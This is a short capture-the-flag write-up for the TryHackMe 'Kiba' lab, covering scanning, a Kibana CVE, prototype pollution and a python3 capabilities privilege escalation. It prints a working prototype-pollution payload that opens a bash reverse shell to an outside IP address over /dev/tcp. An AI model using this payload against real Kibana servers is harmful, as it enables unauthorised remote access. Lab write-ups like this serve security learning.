# Kiba

![](https://assets.tryhackme.com/img/banners/default_tryhackme.png)

---

## nmap

the service on 5601 is kibana
![](images/nmap.png)

## vuln

copy and paste the first task into google to find kibana cve
![](images/cve.png)

## kibana dashboard

go to kibana dashboard
![](images/dashboard.png)

## reverse shell

use prototype pollution to execute a reverse shell and get user

```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.19.194/1337 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

![](images/reverseshell.png)
![](images/user.png)

## User Flag

![](images/userflag.png)

## PrivEsc

list programs with capabilities set
python3
![](images/caps.png)

exploit the python3 capabilities to get root
![](images/root.png)

## Root Flag

![](images/rootflag.png)
